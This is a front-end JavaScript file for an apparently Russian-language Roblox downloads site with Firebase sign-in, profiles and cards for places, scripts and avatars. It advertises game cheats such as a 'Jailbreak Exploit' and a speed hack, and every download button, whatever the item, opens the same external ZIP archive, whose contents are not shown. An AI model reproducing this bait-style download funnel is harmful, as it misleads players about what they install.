// Импорт Firebase v10
import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js';
import { getAuth, onAuthStateChanged, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, sendEmailVerification, GoogleAuthProvider, signInWithPopup, PhoneAuthProvider, signInWithPhoneNumber, RecaptchaVerifier } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-auth.js';
import { getDatabase, ref, set, onValue } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js';

// Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyAEELkMIx4fu9qjPWCID5-LiBqRSaGKpwU",
    authDomain: "game-extensions.firebaseapp.com",
    projectId: "game-extensions",
    storageBucket: "game-extensions.firebasestorage.app",
    messagingSenderId: "68965248738",
    appId: "1:68965248738:web:725083c3b89069a177b8bb",
    measurementId: "G-GHBGWQELT8"
};

// Инициализация Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);

// Providers
const googleProvider = new GoogleAuthProvider();
const phoneProvider = new PhoneAuthProvider(auth);

// Recaptcha for phone
window.recaptchaVerifier = new RecaptchaVerifier('recaptcha-container', {
    'size': 'invisible',
    'callback': () => { /* reCAPTCHA solved */ }
}, auth);

let userData = { name: 'RobloxPlayer', bio: 'Любитель модов и плейсов!', downloads: 0, places: 0, scripts: 0, avatars: 0 };
let confirmationResult;

onAuthStateChanged(auth, (user) => {
    const authForm = document.getElementById('auth-form');
    const profileContent = document.getElementById('profile-content');
    if (user) {
        authForm.style.display = 'none';
        profileContent.style.display = 'block';
        const userRef = ref(db, 'users/' + user.uid);
        onValue(userRef, (snapshot) => {
            userData = snapshot.val() || userData;
            document.getElementById('profile-name').textContent = userData.name || user.displayName || 'RobloxPlayer';
            document.getElementById('profile-bio').textContent = userData.bio;
            document.getElementById('new-name').value = userData.name || user.displayName || '';
            document.getElementById('new-bio').value = userData.bio;
            updateUserProgress();
            if (!user.emailVerified && user.providerData[0].providerId === 'password') {
                document.getElementById('auth-message').textContent = 'Подтвердите email.';
            } else {
                document.getElementById('auth-message').textContent = '';
            }
        });
    } else {
        authForm.style.display = 'block';
        profileContent.style.display = 'none';
    }
});

function showToast(message) {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.style.display = 'block';
    setTimeout(() => {
        toast.style.display = 'none';
    }, 3000);
}

// Email/Password Authentication
function signUp() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    createUserWithEmailAndPassword(auth, email, password)
        .then((userCredential) => {
            const user = userCredential.user;
            sendEmailVerification(user)
                .then(() => {
                    showToast('Регистрация успешна! Проверьте email для подтверждения.');
                    set(ref(db, 'users/' + user.uid), userData);
                })
                .catch((error) => {
                    document.getElementById('auth-message').textContent = 'Ошибка верификации: ' + error.message;
                });
        })
        .catch((error) => {
            document.getElementById('auth-message').textContent = error.message;
        });
}

function signIn() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    signInWithEmailAndPassword(auth, email, password)
        .then((userCredential) => {
            const user = userCredential.user;
            if (!user.emailVerified) {
                sendEmailVerification(user);
                showToast('Подтвердите email для входа.');
            } else {
                showToast('Вход успешен!');
            }
        })
        .catch((error) => {
            document.getElementById('auth-message').textContent = error.message;
        });
}

// Google Authentication
function googleSignIn() {
    signInWithPopup(auth, googleProvider)
        .then((result) => {
            const user = result.user;
            set(ref(db, 'users/' + user.uid), { ...userData, name: user.displayName, email: user.email });
            showToast('Вход через Google успешен!');
        })
        .catch((error) => {
            document.getElementById('auth-message').textContent = error.message;
        });
}

// Phone Authentication
function sendPhoneCode() {
    const phoneNumber = document.getElementById('phone-number').value;
    signInWithPhoneNumber(auth, phoneNumber, window.recaptchaVerifier)
        .then((result) => {
            confirmationResult = result;
            document.getElementById('phone-code').style.display = 'block';
            document.getElementById('verify-phone-btn').style.display = 'block';
            document.getElementById('send-phone-code-btn').style.display = 'none';
            showToast('Код отправлен на телефон!');
        })
        .catch((error) => {
            document.getElementById('auth-message').textContent = error.message;
        });
}

function verifyPhone() {
    const code = document.getElementById('phone-code').value;
    confirmationResult.confirm(code)
        .then((result) => {
            const user = result.user;
            set(ref(db, 'users/' + user.uid), userData);
            showToast('Вход через телефон успешен!');
        })
        .catch((error) => {
            document.getElementById('auth-message').textContent = error.message;
        });
}

// Profile Management
function signOutUser() {
    signOut(auth).then(() => {
        document.getElementById('auth-message').textContent = 'Вы вышли!';
        setTimeout(() => document.getElementById('auth-message').textContent = '', 3000);
    }).catch((error) => {
        console.error('Ошибка выхода:', error);
    });
}

function resendVerification() {
    if (auth.currentUser) {
        sendEmailVerification(auth.currentUser)
            .then(() => {
                showToast('Код выслан на указанный адрес почты');
            })
            .catch((error) => {
                document.getElementById('auth-message').textContent = 'Ошибка: ' + error.message;
            });
    }
}

function saveProfile() {
    if (auth.currentUser) {
        const newName = document.getElementById('new-name').value || userData.name;
        const newBio = document.getElementById('new-bio').value || userData.bio;
        set(ref(db, 'users/' + auth.currentUser.uid), {
            ...userData,
            name: newName,
            bio: newBio
        });
        showToast('Профиль обновлён!');
    }
}

// Data for Cards (with dynamic image parsing from Roblox API)
const allPlaces = [
    { id: 1, title: "Adopt Me!", desc: "Виртуальные питомцы.", rating: "★★★★★", genre: "adventure", placeId: 920587237, video: "https://www.youtube.com/embed/Wz9M1zM0k8s" },
    { id: 2, title: "Brookhaven", desc: "Ролевой город.", rating: "★★★★☆", genre: "rpg", placeId: 4924922222, video: "https://www.youtube.com/embed/5o4bY6X7pH8" },
    { id: 3, title: "Jailbreak", desc: "Побег из тюрьмы.", rating: "★★★★★", genre: "adventure", placeId: 606849621, video: "https://www.youtube.com/embed/0i5e9z1G5oM" },
    { id: 4, title: "Blox Fruits", desc: "Пиратские приключения.", rating: "★★★★★", genre: "rpg", placeId: 2753915549, video: "https://www.youtube.com/embed/7tY8V3T8l0s" },
    { id: 5, title: "Doors", desc: "Хоррор с дверями.", rating: "★★★★☆", genre: "adventure", placeId: 6516141723, video: "https://www.youtube.com/embed/-z2zIz4O2LE" },
    { id: 6, title: "Arsenal", desc: "Шутер с оружием.", rating: "★★★★★", genre: "obby", placeId: 286090429, video: "https://www.youtube.com/embed/3s3Z1W0rD0U" }
];

const allScripts = [
    { id: 1, title: "Auto Farm Script", desc: "Автоматизация для плейсов.", scriptId: 606849621 },
    { id: 2, title: "Jailbreak Exploit", desc: "Скрипт для Jailbreak.", scriptId: 2753915549 },
    { id: 3, title: "Blox Fruits ESP", desc: "Видеть врагов и предметы.", scriptId: 6516141723 },
    { id: 4, title: "Doors Speed Hack", desc: "Увеличение скорости в Doors.", scriptId: 286090429 }
];

const allAvatars = [
    { id: 1, title: "Cool Roblox Avatar", desc: "Скачай и используй в игре.", userId: 1 },
    { id: 2, title: "Epic Avatar", desc: "Уникальный стиль.", userId: 2 },
    { id: 3, title: "Neon Avatar", desc: "Светящийся дизайн.", userId: 3 },
    { id: 4, title: "Futuristic Avatar", desc: "Футуристический вид.", userId: 4 }
];

let currentPage = 1;
const placesPerPage = 6;
let currentFilter = { search: '', genre: '' };

function renderPlaces() {
    const grid = document.getElementById('places-grid');
    grid.innerHTML = '';
    const filtered = allPlaces.filter(p => p.title.toLowerCase().includes(currentFilter.search.toLowerCase()) && (!currentFilter.genre || p.genre === currentFilter.genre));
    const start = (currentPage - 1) * placesPerPage;
    const end = start + placesPerPage;
    filtered.slice(start, end).forEach(place => {
        const card = document.createElement('div');
        card.className = 'place-card';
        const imgUrl = `https://thumbnails.roblox.com/v1/places/icons?placeIds=${place.placeId}&size=420x420&format=Png&isCircular=false`;
        card.innerHTML = `
            <img src="${imgUrl}" alt="${place.title}">
            <h4>${place.title}</h4>
            <p>${place.desc}</p>
            <p>${place.rating}</p>
            <button class="cta-btn details-btn" data-id="${place.id}">Подробнее</button>
            <div class="place-details" style="display: none;">
                <iframe width="100%" height="200" src="${place.video}" frameborder="0" allowfullscreen></iframe>
                <button class="cta-btn download-btn" data-type="place" data-id="${place.id}">Скачать</button>
            </div>
        `;
        grid.appendChild(card);
    });
    updatePaginationPlaces(filtered.length);
    document.querySelectorAll('.details-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const details = btn.nextElementSibling;
            details.style.display = details.style.display === 'none' ? 'block' : 'none';
        });
    });
    document.querySelectorAll('.download-btn[data-type="place"]').forEach(btn => {
        btn.addEventListener('click', () => downloadPlace(parseInt(btn.dataset.id)));
    });
}

function renderScripts() {
    const grid = document.getElementById('scripts-grid');
    grid.innerHTML = '';
    allScripts.forEach(script => {
        const card = document.createElement('div');
        card.className = 'script-card';
        const imgUrl = `https://tr.rbxcdn.com/asset-thumbnail/image?assetId=${script.scriptId}&width=420&height=420&format=png`;
        card.innerHTML = `
            <img src="${imgUrl}" alt="${script.title}">
            <h4>${script.title}</h4>
            <p>${script.desc}</p>
            <button class="cta-btn download-btn" data-type="script" data-id="${script.id}">Скачать</button>
        `;
        grid.appendChild(card);
    });
    document.querySelectorAll('.download-btn[data-type="script"]').forEach(btn => {
        btn.addEventListener('click', () => downloadScript(parseInt(btn.dataset.id)));
    });
}

function renderAvatars() {
    const grid = document.getElementById('avatars-grid');
    grid.innerHTML = '';
    allAvatars.forEach(avatar => {
        const card = document.createElement('div');
        card.className = 'avatar-card';
        const imgUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${avatar.userId}&width=420&height=420&format=png`;
        card.innerHTML = `
            <img src="${imgUrl}" alt="${avatar.title}">
            <h4>${avatar.title}</h4>
            <p>${avatar.desc}</p>
            <button class="cta-btn download-btn" data-type="avatar" data-id="${avatar.id}">Скачать</button>
        `;
        grid.appendChild(card);
    });
    document.querySelectorAll('.download-btn[data-type="avatar"]').forEach(btn => {
        btn.addEventListener('click', () => downloadAvatar(parseInt(btn.dataset.id)));
    });
}

function updatePaginationPlaces(total) {
    const pag = document.getElementById('pagination-places');
    pag.innerHTML = '';
    const pages = Math.ceil(total / placesPerPage);
    if (currentPage > 1) {
        const prev = document.createElement('button');
        prev.textContent = '←';
        prev.addEventListener('click', () => { currentPage--; renderPlaces(); });
        pag.appendChild(prev);
    }
    for (let i = 1; i <= pages; i++) {
        const btn = document.createElement('button');
        btn.textContent = i;
        btn.className = currentPage === i ? 'active' : '';
        btn.addEventListener('click', () => { currentPage = i; renderPlaces(); });
        pag.appendChild(btn);
    }
    if (currentPage < pages) {
        const next = document.createElement('button');
        next.textContent = '→';
        next.addEventListener('click', () => { currentPage++; renderPlaces(); });
        pag.appendChild(next);
    }
}

function filterPlaces() {
    currentFilter.search = document.getElementById('search-places').value;
    currentFilter.genre = document.getElementById('genre-filter').value;
    currentPage = 1;
    renderPlaces();
}

function downloadPlace(id) {
    if (auth.currentUser) {
        userData.places++;
        userData.downloads++;
        set(ref(db, 'users/' + auth.currentUser.uid), userData);
        showToast('Скачивание начато!');
    } else {
        alert('Войдите для скачивания!');
    }
    window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
}

function downloadScript(id) {
    if (auth.currentUser) {
        userData.scripts++;
        userData.downloads++;
        set(ref(db, 'users/' + auth.currentUser.uid), userData);
        showToast('Скачивание начато!');
    } else {
        alert('Войдите для скачивания!');
    }
    window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
}

function downloadAvatar(id) {
    if (auth.currentUser) {
        userData.avatars++;
        userData.downloads++;
        set(ref(db, 'users/' + auth.currentUser.uid), userData);
        showToast('Скачивание начато!');
    } else {
        alert('Войдите для скачивания!');
    }
    window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
}

function updateUserProgress() {
    document.getElementById('user-downloads').textContent = userData.downloads;
    const totalPlaces = allPlaces.length;
    document.getElementById('user-places').textContent = `${userData.places}/${totalPlaces}`;
    document.getElementById('user-scripts').textContent = userData.scripts;
    const totalAvatars = allAvatars.length;
    document.getElementById('user-avatars').textContent = `${userData.avatars}/${totalAvatars}`;
    const percent = ((userData.places + userData.scripts + userData.avatars) / (totalPlaces + totalAvatars + allScripts.length) * 100).toFixed(1);
    document.querySelector('.progress-fill').style.width = percent + '%';
    document.querySelector('.progress-bar span').textContent = `Прогресс: ${percent}%`;
}

function switchSection(sectionId) {
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(sectionId).classList.add('active');
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.querySelector(`.nav-btn[data-section="${sectionId}"]`).classList.add('active');
    if (sectionId === 'places') renderPlaces();
    if (sectionId === 'scripts') renderScripts();
    if (sectionId === 'avatars') renderAvatars();
}

function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
}

function initParticles() {
    const canvas = document.getElementById('particles-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const particles = [];
    for (let i = 0; i < 50; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            vx: (Math.random() - 0.5) * 2,
            vy: (Math.random() - 0.5) * 2,
            radius: Math.random() * 3 + 1,
            color: `hsl(${Math.random() * 60 + 210}, 100%, 50%)`
        });
    }
    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        particles.forEach(p => {
            p.x += p.vx;
            p.y += p.vy;
            if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
            if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
            ctx.fillStyle = p.color;
            ctx.fill();
        });
        requestAnimationFrame(animate);
    }
    animate();
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
}

function updateProfileTime() {
    const now = new Date();
    now.setHours(18, 37, 0, 0); // 06:37 PM CEST
    const timeString = now.toLocaleString('ru-RU', { timeZone: 'Europe/Paris', hour: '2-digit', minute: '2-digit', day: 'numeric', month: 'long', year: 'numeric' }).replace('г.', ' ').replace(' в ', ', ');
    document.getElementById('current-time').textContent = timeString;
    document.getElementById('current-time-profile').textContent = timeString;
}

document.addEventListener('DOMContentLoaded', () => {
    if (localStorage.getItem('darkMode') === 'true') document.body.classList.add('dark-mode');
    switchSection('home');
    renderPlaces();
    renderScripts();
    renderAvatars();
    updateUserProgress();
    updateProfileTime();
    setInterval(updateProfileTime, 60000);
    initParticles();

    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', () => switchSection(btn.dataset.section));
    });

    document.querySelector('.dark-toggle').addEventListener('click', toggleDarkMode);

    document.getElementById('sign-up-btn').addEventListener('click', signUp);
    document.getElementById('sign-in-btn').addEventListener('click', signIn);
    document.getElementById('google-sign-in-btn').addEventListener('click', googleSignIn);
    document.getElementById('send-phone-code-btn').addEventListener('click', sendPhoneCode);
    document.getElementById('verify-phone-btn').addEventListener('click', verifyPhone);
    document.getElementById('sign-out-btn').addEventListener('click', signOutUser);
    document.getElementById('save-profile-btn').addEventListener('click', saveProfile);
    document.getElementById('resend-verification-btn').addEventListener('click', resendVerification);

    document.querySelector('.filter-btn').addEventListener('click', filterPlaces);
});
